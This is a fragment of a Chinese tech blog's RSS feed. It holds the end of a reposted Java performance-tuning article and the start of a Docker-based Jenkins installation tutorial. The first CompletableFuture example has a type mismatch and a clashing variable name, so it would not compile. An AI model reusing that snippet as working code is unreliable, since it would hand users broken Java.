&lt;h4 id=&#34;四、数据库优化&#34;&gt;&lt;a href=&#34;#四、数据库优化&#34; class=&#34;headerlink&#34; title=&#34;四、数据库优化&#34;&gt;&lt;/a&gt;四、数据库优化&lt;/h4&gt;&lt;p&gt;1.inner join 、left join、right join，优先使用inner join&lt;/p&gt;
&lt;p&gt;2.表连接不宜太多，索引不宜太多，一般5个以内&lt;/p&gt;
&lt;p&gt;3.复合索引最左特性&lt;/p&gt;
&lt;p&gt;4.操作delete或者update语句，加个limit或者循环分批次删除&lt;/p&gt;
&lt;p&gt;5.使用explain分析你SQL执行计划&lt;/p&gt;
&lt;p&gt;SQL性能优化的47个小技巧，果断收藏！&lt;/p&gt;
&lt;h4 id=&#34;五、复用优化&#34;&gt;&lt;a href=&#34;#五、复用优化&#34; class=&#34;headerlink&#34; title=&#34;五、复用优化&#34;&gt;&lt;/a&gt;五、复用优化&lt;/h4&gt;&lt;p&gt;写代码的时候，大家一般都会将重复性的代码提取出来，写成工具方法，在下次用的时候，就不用重新编码，直接调用就可以了。&lt;/p&gt;
&lt;p&gt;这个就是复用。&lt;/p&gt;
&lt;p&gt;数据库连接池、线程池、长连接也都是复用手段，这些对象的创建和销毁成本过高，复用之后，效率提升显著。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、连接池&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;连接池是一种常见的优化网络连接复用性的方法。连接池管理着一定数量的网络连接，并且在需要时将这些连接分配给客户端，客户端使用完后将连接归还给连接池。这样可以避免每次通信都建立新的连接，减少了连接的建立和销毁过程，提高了系统的性能和效率。&lt;/p&gt;
&lt;p&gt;在Java开发中，常用的连接池技术有Apache Commons Pool、Druid等。使用连接池时，需要合理设置连接池的大小，并根据实际情况进行调优。连接池的大小过小会导致连接不够用，而过大则会占用过多的系统资源。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、长连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;长连接是另一种优化网络连接复用性的方法。长连接指的是在一次通信后，保持网络连接不关闭，以便后续的通信继续复用该连接。与短连接相比，长连接在一定程度上减少了连接的建立和销毁过程，提高了网络连接的复用性和效率。&lt;/p&gt;
&lt;p&gt;在Java开发中，可以通过使用Socket编程实现长连接。客户端在建立连接后，通过设置Socket的Keep-Alive选项，使得连接保持活跃状态。这样可以避免频繁地建立新的连接，提高网络连接的复用性和效率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、缓存&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;缓存也是比较常用的复用，属于数据复用。&lt;/p&gt;
&lt;p&gt;缓存一般是将数据库中的数据缓存到内存或者Redis中，也就是缓存到相对高速的区域，下次查询时，直接访问缓存，就不用查询数据库了，缓存主要针对的是读操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、缓冲&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;缓冲常见于对数据的暂存，然后批量传输或者写入。多使用顺序方式，用来缓解不同设备之间频繁地、缓慢地随机写，缓冲主要针对的是写操作。&lt;/p&gt;
&lt;h4 id=&#34;六、并行优化&#34;&gt;&lt;a href=&#34;#六、并行优化&#34; class=&#34;headerlink&#34; title=&#34;六、并行优化&#34;&gt;&lt;/a&gt;六、并行优化&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;1、异步编程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上面的优化方式就是异步优化，充分利用多核处理器的性能，将串行的程序改为并行，大大提高了程序的执行效率。&lt;/p&gt;
&lt;p&gt;异步编程是一种编程模型，其中任务的执行不会阻塞当前线程的执行。通过将任务提交给其他线程或线程池来处理，当前线程可以继续执行其他操作，而不必等待任务完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、异步编程的特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.非阻塞：异步任务的执行不会导致调用线程的阻塞，允许线程继续执行其他任务；&lt;/p&gt;
&lt;p&gt;2.回调机制：异步任务通常会注册回调函数，当任务完成时，会调用相应的回调函数进行后续处理；&lt;/p&gt;
&lt;p&gt;3.提高响应性：异步编程能够提高程序的响应性，尤其适用于处理IO密集型任务，如网络请求、数据库查询等；&lt;/p&gt;
&lt;p&gt;Java 8引入了CompletableFuture类，可以方便地进行异步编程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、并行编程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;并行编程是一种利用多个线程或处理器同时执行多个任务的编程模型。它将大任务划分为多个子任务，并发地执行这些子任务，从而加速整体任务的完成时间。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、并行编程的特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.分布式任务：并行编程将大任务划分为多个独立的子任务，每个子任务在不同的线程中并行执行；&lt;/p&gt;
&lt;p&gt;2..数据共享：并行编程需要考虑多个线程之间的数据共享和同步问题，以避免出现竞态条件和数据不一致的情况；&lt;/p&gt;
&lt;p&gt;3.提高性能：并行编程能够充分利用多核处理器的计算能力，加速程序的执行速度。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5、并行编程如何实现？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.多线程：Java提供了Thread类和Runnable接口，用于创建和管理多个线程。通过创建多个线程并发执行任务，可以实现并行编程。&lt;/p&gt;
&lt;p&gt;2.线程池：Java的Executor框架提供了线程池的支持，可以方便地管理和调度多个线程。通过线程池，可以复用线程对象，减少线程创建和销毁的开销；&lt;/p&gt;
&lt;p&gt;3.并发集合：Java提供了一系列的并发集合类，如ConcurrentHashMap、ConcurrentLinkedQueue等，用于在并行编程中实现线程安全的数据共享。&lt;/p&gt;
&lt;p&gt;异步编程和并行编程是Java中处理任务并提高程序性能的两种重要方法。&lt;/p&gt;
&lt;p&gt;异步编程通过非阻塞的方式处理任务，提高程序的响应性，并适用于IO密集型任务。&lt;/p&gt;
&lt;p&gt;而并行编程则是通过多个线程或处理器并发执行任务，充分利用计算资源，加速程序的执行速度。&lt;/p&gt;
&lt;p&gt;在Java中，可以使用CompletableFuture和回调接口实现异步编程，使用多线程、线程池和并发集合实现并行编程。通过合理地运用异步和并行编程，我们可以在Java中高效地处理任务和提升程序的性能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6、代码示例&lt;/strong&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 创建线程池&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ExecutorService executor = Executors.newFixedThreadPool(10);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 使用线程池创建CompletableFuture对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    CompletableFuture&amp;lt;Integer&amp;gt; future = CompletableFuture.supplyAsync(() -&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 一些不为人知的操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;quot;result&amp;quot;; // 返回结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, executor);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 使用CompletableFuture对象执行任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    CompletableFuture&amp;lt;String&amp;gt; result = future.thenApply(result -&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 一些不为人知的操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;quot;result&amp;quot;; // 返回结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 处理任务结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String finalResult = result.join();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // 关闭线程池&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    executor.shutdown();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7、Java 8 parallel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）parallel()是什么&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Stream.parallel() 方法是 Java 8 中 Stream API 提供的一种并行处理方式。在处理大量数据或者耗时操作时，使用 Stream.parallel() 方法可以充分利用多核 CPU 的优势，提高程序的性能。&lt;/p&gt;
&lt;p&gt;Stream.parallel() 方法是将串行流转化为并行流的方法。通过该方法可以将大量数据划分为多个子任务交由多个线程并行处理，最终将各个子任务的计算结果合并得到最终结果。使用 Stream.parallel() 可以简化多线程编程，减少开发难度。&lt;/p&gt;
&lt;p&gt;需要注意的是，并行处理可能会引入线程安全等问题，需要根据具体情况进行选择。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）举一个简单的demo&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;定义一个list，然后通过parallel() 方法将集合转化为并行流，对每个元素进行i++，最后通过 collect(Collectors.toList()) 方法将结果转化为 List 集合。&lt;/p&gt;
&lt;p&gt;使用并行处理可以充分利用多核 CPU 的优势，加快处理速度。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class StreamTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        List&amp;lt;Integer&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i = 0; i &amp;lt; 10; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            list.add(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(list);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        List&amp;lt;Integer&amp;gt; result = list.stream().parallel().map(i -&amp;gt; i++).collect(Collectors.toList());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(result);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我勒个去，什么情况？&lt;br&gt;&lt;img src=&#34;/img/2024/202405104.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）parallel()的优缺点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;①优点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.充分利用多核 CPU 的优势，提高程序的性能；&lt;/p&gt;
&lt;p&gt;2.可以简化多线程编程，减少开发难度。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;②缺点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.并行处理可能会引入线程安全等问题，需要根据具体情况进行选择；&lt;/p&gt;
&lt;p&gt;2.并行处理需要付出额外的开销，例如线程池的创建和销毁、线程切换等，对于小数据量和简单计算而言，串行处理可能更快。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）何时使用parallel()？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实际开发中，应该根据数据量、计算复杂度、硬件等因素综合考虑。&lt;/p&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;p&gt;1.数据量较大，有1万个元素；&lt;/p&gt;
&lt;p&gt;2.计算复杂度过大，需要对每个元素进行复杂的计算；&lt;/p&gt;
&lt;p&gt;3.硬件够硬，比如多核CPU。&lt;/p&gt;
&lt;h4 id=&#34;七、算法优化&#34;&gt;&lt;a href=&#34;#七、算法优化&#34; class=&#34;headerlink&#34; title=&#34;七、算法优化&#34;&gt;&lt;/a&gt;七、算法优化&lt;/h4&gt;&lt;p&gt;在上面的例子中，避免base64解密，就应该归类于算法优化。&lt;/p&gt;
&lt;p&gt;程序就是由数据结构和算法组成，一个优质的算法可以显著提高程序的执行效率，从而减少运行时间和资源消耗。相比之下，一个低效的算法就可能导致运行非常缓慢，并占用大量系统资源。&lt;/p&gt;
&lt;p&gt;很多问题都可以通过算法优化来解决，比如：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、循环和递归&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;循环和递归是Java编程中常见的操作，然而，过于复杂的业务逻辑往往会带来多层循环套用，不必要的重复循环会大大降低程序的执行效率。&lt;/p&gt;
&lt;p&gt;递归是一种函数自我调用的技术，类似于循环，虽然递归可以解决很多问题，但是，递归的效率有待提高。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、内存管理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Java自带垃圾收集器，开发人员不用手动释放内存。&lt;/p&gt;
&lt;p&gt;但是，不合理的内存使用可能导致内存泄漏和性能下降，确保及时释放不再使用的对象，避免创建过多的临时对象。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我觉得字符串是Java编程中使用频率最高的技术，很多程序员恨不得把所有的变量都定义成字符串。&lt;/p&gt;
&lt;p&gt;然而，由于字符串是不可变的，每次执行字符串拼接、替换时，都会创建一个新的字符串。这会占用大量的内存和处理时间。&lt;/p&gt;
&lt;p&gt;使用StringBuilder来处理字符串的拼接可以显著的提高性能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、IO操作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IO操作通常是最耗费性能和资源的操作。在处理大量数据IO操作时，务必注意优化IO代码，提高程序性能，比如上面提高的图片不落地就是彻底解决IO问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5、数据结构的选择&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;选择适当的数据结构对程序的性能至关重要。&lt;/p&gt;
&lt;p&gt;比如Java世界中用的第二多的Map，比较常用的有HashMap、HashTable、ConcurrentHashMap。&lt;/p&gt;
&lt;p&gt;HashMap，底层数组+链表实现，可以存储null键和null值，线程不安全；&lt;/p&gt;
&lt;p&gt;HashTable，底层数组+链表实现，无论key还是value都不能为null，线程安全，实现线程安全的方式是在修改数据时锁住整个HashTable，效率低，ConcurrentHashMap做了相关优化；&lt;/p&gt;
&lt;p&gt;ConcurrentHashMap，底层采用分段的数组+链表实现，线程安全，通过把整个Map分为N个Segment，可以提供相同的线程安全，但是效率提升N倍，默认提升16倍。&lt;/p&gt;
&lt;p&gt;Hashtable的synchronized是针对整张Hash表的，即每次锁住整张表让线程独占，ConcurrentHashMap允许多个修改操作并发进行，其关键在于使用了锁分离技术。&lt;/p&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/V2p_p-KoDowlZxLN2by2Sg&#34;&gt;哪吒编程&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2024/04/06/five-jenkis/</guid>
            <title>5分钟搞定Jenkis</title>
            <link>https://erik.xyz/2024/04/06/five-jenkis/</link>
            <category>转载</category>
            <category>jenkis</category>
            <category>jenkis教程</category>
            <pubDate>Sat, 06 Apr 2024 09:04:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;h4 id=&#34;什么是持续集成&#34;&gt;&lt;a href=&#34;#什么是持续集成&#34; class=&#34;headerlink&#34; title=&#34;什么是持续集成&#34;&gt;&lt;/a&gt;什么是持续集成&lt;/h4&gt;&lt;p&gt;持续集成 Continuous integration ，简称CI随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能在不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;持续集成具有的特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;它是一个自动化的周期性的集成测试过程，从检出代码、编译构建、运行测试、结果记录、测试统计等都是自动完成的，无需人工干预；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;需要有专门的集成服务器来执行集成构建；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;需要有代码托管工具支持，例如Git以及可视化界面Gogs的使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;持续集成的作用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保证团队开发人员提交代码的质量，减轻了软件发布时的压力；&lt;/li&gt;
&lt;li&gt;持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量；&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Jenkins简介&#34;&gt;&lt;a href=&#34;#Jenkins简介&#34; class=&#34;headerlink&#34; title=&#34;Jenkins简介&#34;&gt;&lt;/a&gt;Jenkins简介&lt;/h4&gt;&lt;p&gt;Jenkins，原名Hudson，2011年改为现在的名字，它是一个开源的实现持续集成的软件工具。官方网站：&lt;a href=&#34;http://jenkins-ci.org/。&#34;&gt;http://jenkins-ci.org/。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。&lt;/p&gt;
&lt;p&gt;特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;易安装：仅仅两个docker命令即可从官网下载直接运行，无需额外的安装，更无需安装数据库；&lt;/li&gt;
&lt;li&gt;易配置：提供友好的GUI配置界面；&lt;/li&gt;
&lt;li&gt;变更支持：Jenkins能从代码仓库（Subversion/CVS）中获取并产生代码更新列表并输出到编译输出信息中；&lt;/li&gt;
&lt;li&gt;支持永久链接：用户是通过web来访问Jenkins的，而这些web页面的链接地址都是永久链接地址，因此，你可以在各种文档中直接使用该链接；&lt;/li&gt;
&lt;li&gt;集成E-Mail/RSS/IM：当完成一次集成时，可通过这些工具实时告诉你集成结果（据我所知，构建一次集成需要花费一定时间，有了这个功能，你就可以在等待结果过程中，干别的事情）；&lt;/li&gt;
&lt;li&gt;JUnit/TestNG测试报告：也就是用以图表等形式提供详细的测试报表功能；&lt;/li&gt;
&lt;li&gt;支持分布式构建：Jenkins可以把集成构建等工作分发到多台计算机中完成；&lt;/li&gt;
&lt;li&gt;文件指纹信息：Jenkins会保存哪次集成构建产生了哪些jars文件，哪一次集成构建使用了哪个版本的jars文件等构建记录；&lt;/li&gt;
&lt;li&gt;支持第三方插件：使得 Jenkins 变得越来越强大Jenkins安装与启动（1）执行安装命令,下载jenkins&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Jenkins安装与启动&#34;&gt;&lt;a href=&#34;#Jenkins安装与启动&#34; class=&#34;headerlink&#34; title=&#34;Jenkins安装与启动&#34;&gt;&lt;/a&gt;Jenkins安装与启动&lt;/h4&gt;&lt;p&gt;1）执行安装命令,下载jenkins&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker pull jenkins/jenkins&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（2）启动服务&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker run -p 8080:8080 -p 50000:50000 -v /mnt/data/jenkins:/var/jenkins_home --name &amp;quot;jenkins&amp;quot; jenkins/jenkins&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240411.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;若报错如下:&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;touch: cannot touch ‘/var/jenkins_home/copy_reference_file.log’: Permission denied&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Can not write to /var/jenkins_home/copy_reference_file.log. Wrong volume permissions?&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;需要修改下目录权限, 因为当映射本地数据卷时，/mnt/data/jenkins目录的拥有者为root用户，而容器中jenkins user的uid为1000&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo chown -R 1000:1000 /mnt/data/jenkins&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;（3）访问链接 &lt;a href=&#34;http://10.20.29.151:8080&#34;&gt;http://10.20.29.151:8080&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;若密码忘记，可进入容器，执行&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /var/lib/jenkins/secrets/initialAdminPassword&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;获取初始密码串。&lt;/p&gt;
&lt;p&gt;若目录不存在，可使用&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find / -name &amp;quot;initialAdminPassword&amp;quot; -depth -print&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;命令查找。&lt;br&gt;&lt;img src=&#34;/img/2024/20240412.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（4）安装插件&lt;br&gt;&lt;img src=&#34;/img/2024/20240413.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240414.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;（5）新建用户&lt;br&gt;&lt;img src=&#34;/img/2024/20240415.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;完成安装进入主界面&lt;br&gt;&lt;img src=&#34;/img/2024/20240416.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;Jenkins插件安装&#34;&gt;&lt;a href=&#34;#Jenkins插件安装&#34; class=&#34;headerlink&#34; title=&#34;Jenkins插件安装&#34;&gt;&lt;/a&gt;Jenkins插件安装&lt;/h4&gt;&lt;p&gt;我们以安装maven插件为例，演示插件的安装&lt;/p&gt;
